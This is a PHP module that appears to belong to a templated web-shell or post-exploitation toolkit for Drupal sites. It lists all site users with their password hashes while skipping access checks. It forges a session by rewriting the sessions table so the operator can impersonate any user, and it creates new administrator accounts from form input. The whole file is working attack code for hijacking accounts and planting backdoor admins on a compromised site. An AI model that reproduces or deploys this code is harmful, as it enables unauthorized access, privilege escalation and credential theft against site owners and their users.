<?php

// section.constants
$IMPERSONATE_DRUPAL_USER = "__FEAT_IMPERSONATE_DRUPAL_USER__";
// section.constants.end

// section.functions
/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function __PREFIX__makeDrupalImpersonatePage(&$page_content, $features, $page, $css) {
    $users        = __PREFIX__getDrupalUsers();
    $page_content = __PREFIX__makePage(
        $features,
        $page,
        $css,
        [
            __PREFIX__makePageHeader(
                $features[$page]["title"],
                $features[$page]["description"]
            ),
            __PREFIX__makeTable(
                "Users",
                "Drupal users to impersonate",
                $users,
                [
                    "username" => "Username",
                    "email"    => "Email",
                    "active"   => "Active",
                    "blocked"  => "Blocked",
                    "roles"    => "Roles",
                    "actions"  => "Actions",
                ],
                "
                        <dialog id='create-drupal-user' class='p-4 rounded w-1/3'>" .
                __PREFIX__makeForm(
                    $page,
                    $_SERVER["REQUEST_URI"],
                    [
                        "<div class='flex items-center justify-between'>
                            <h3 class='text-lg font-semibold text-zinc-800'>Create Drupal user</h3>
                            <button onclick='document.getElementById(\"create-drupal-user\").close(); document.getElementById(\"create-drupal-user\").classList.remove(\"flex\")' 
                                class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                &times;
                            </button>
                        </div>",
                        __PREFIX__makeInput(
                            "text",
                            "Username",
                            "__PARAM_2__",
                            "admin",
                            "Username of the user to create.",
                            true
                        ),
                        __PREFIX__makeInput(
                            "text",
                            "Email",
                            "__PARAM_3__",
                            "admin@example.com",
                            "Email of the user to create.",
                            true
                        ),
                        __PREFIX__makeInput(
                            "password",
                            "Password",
                            "__PARAM_4__",
                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                            "Password of the user to create.",
                            true
                        ),
                    ],
                    "post",
                    "Create user",
                    "flex flex-col gap-y-6 mx-auto w-full"
                )
                . "
                    </dialog>
                    <button onclick='document.getElementById(\"create-drupal-user\").showModal()' 
                        class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                            hover:bg-zinc-700 transition-all duration-300'>
                        Create user
                    </button>"
            ),
        ]
    );
}

/**
 * Lists all Drupal users
 */
function __PREFIX__getDrupalUsers() {
    global $IMPERSONATE_DRUPAL_USER;

    // Load all user roles.
    $roles = \Drupal\user\Entity\Role::loadMultiple();
    // Get all permissions.
    $permissions = \Drupal::service('user.permissions')
        ->getPermissions();

    // Get a list of all users.
    $query = \Drupal::entityQuery('user')
        ->accessCheck(false);
    $uids  = $query->execute();

    // Load user entities.
    $users = \Drupal\user\Entity\User::loadMultiple($uids);

    $result = [];

    // Iterate through each user.
    foreach ($users as $user) {
        $partial_result = [];

        $username                   = $user->getAccountName();
        $partial_result["username"] = empty($username) ? "Anonymous" : $username;
        $partial_result["id"]       = $user->id();
        $partial_result["email"]    = $user->getEmail();
        $partial_result["active"]   = $user->isActive() ? "Yes" : "No";
        $partial_result["blocked"]  = $user->isBlocked() ? "Yes" : "No";
        $partial_result["uuid"]     = $user->uuid();
        $partial_result["password"] = $user->getPassword();
        $partial_result["actions"]  = !empty($username)
            ? __PREFIX__makeForm(
                $IMPERSONATE_DRUPAL_USER,
                $_SERVER["REQUEST_URI"],
                [
                    __PREFIX__makeInput(
                        "hidden",
                        "Username",
                        "__PARAM_1__",
                        "",
                        "Username of the user to impersonate.",
                        true,
                        null,
                        $partial_result["id"]
                    ),
                ],
                "post",
                "Impersonate",
                "flex flex-col max-w-xl mb-0"
            )
            : "";

        // Get assigned roles for the user.
        $user_roles              = $user->getRoles();
        $partial_result["roles"] = implode(", ", $user_roles);

        $result[] = $partial_result;
    }

    return $result;
}

/**
 * Impersonate a Drupal user
 *
 * @param $username string Username of the user to impersonate
 */
function __PREFIX__impersonateDrupalUser($id) {
    // Load the user by username.
    $user = \Drupal\user\Entity\User::load($id);

    // Check if the user exists.
    if ($user) {
        $database = \Drupal::database();

        $auth           = true;
        $sf2_meta       = [
            // session timestamp
            "u" => time(),
            // login timestamp as from user_field_data
            "c" => time(),
            // max session lifetime as per core.services.yml
            "l" => 2000000,
            // csrf token seed - set via Crypt::randomBytesBase64()
            "s" => \Drupal\Component\Utility\Crypt::randomBytesBase64(),
        ];
        $sf2_attributes = ["uid" => "$id"];

        $prefix = $database->getPrefix();

        $forged_session = "auth|" .
                          serialize($auth) .
                          "_sf2_meta|" .
                          serialize($sf2_meta) .
                          "_sf2_attributes|" .
                          serialize($sf2_attributes);

        try {
            $database->query(
                "update {$prefix}sessions as s set s.session=:a, timestamp=:b, uid=:c where sid=:d",
                [
                    ":a" => $forged_session,
                    ":b" => $sf2_meta['u'],
                    ":c" => $id,
                    ":d" => \Drupal\Component\Utility\Crypt::hashBase64(session_id()),
                ]
            )
                ->execute();
        }
        catch (Exception $e) {
            // Uncaught exception as for some reason it fail also when the query executes successfully
        }

        // Set the authenticated user
        Drupal::currentUser()
            ->setAccount($user);
    }

    return new \Symfony\Component\HttpFoundation\RedirectResponse('/admin');
}

/**
 * Adds a Drupal administrator user.
 *
 * @param $username string The username of the new user.
 * @param $email string The email address of the new user.
 * @param $password string The password for the new user.
 */
function __PREFIX__addDrupalAdministratorUser($username, $email, $password) {
    // Load the user roles.
    $roles = \Drupal\user\Entity\Role::loadMultiple();

    // Define the roles for the administrator user.
    $administrator_roles = ['administrator'];

    // Create a new user entity.
    $user = \Drupal\user\Entity\User::create();

    // Set the username, email, and password.
    $user->setUsername($username);
    $user->setEmail($email);
    $user->setPassword($password);

    // Set the user status to active.
    $user->activate();

    // Assign roles to the user.
    foreach ($administrator_roles as $role) {
        if (isset($roles[$role])) {
            $user->addRole($role);
        }
    }

    // Save the user.
    $user->save();
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return mixed
 */
function __PREFIX__handleDrupalImpersonate($operation, $features) {
    if (!empty($_POST["__PARAM_1__"])) {
        return __PREFIX__impersonateDrupalUser($_POST["__PARAM_1__"]);
    }
    elseif (!empty($_POST["__PARAM_2__"]) &&
            !empty($_POST["__PARAM_3__"]) &&
            !empty($_POST["__PARAM_4__"])) {
        __PREFIX__addDrupalAdministratorUser(
            $_POST["__PARAM_2__"],
            $_POST["__PARAM_3__"],
            $_POST["__PARAM_4__"]
        );

        return new \Symfony\Component\HttpFoundation\RedirectResponse($_SERVER["REQUEST_URI"]);
    }
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function __PREFIX__drupalImpersonateHooksIsolatedOps(&$isolated_ops) {
    global $IMPERSONATE_DRUPAL_USER;

    $isolated_ops[] = $IMPERSONATE_DRUPAL_USER;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__drupalImpersonateHooksFeatures(&$features) {
    global $IMPERSONATE_DRUPAL_USER;

    $features[] = [
        "title"       => "Impersonate Drupal user",
        "description" => "Impersonate a Drupal user by changing the current session.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
</svg>',
        "op"          => $IMPERSONATE_DRUPAL_USER,
    ];
}

// section.functions.end

// section.hooks
add_hook("isolated_ops", "__PREFIX__drupalImpersonateHooksIsolatedOps");
add_hook("features", "__PREFIX__drupalImpersonateHooksFeatures");
add_named_hook("GET_page", $IMPERSONATE_DRUPAL_USER, "__PREFIX__makeDrupalImpersonatePage");
add_named_hook("POST_operation", $IMPERSONATE_DRUPAL_USER, "__PREFIX__handleDrupalImpersonate");
// section.hooks.end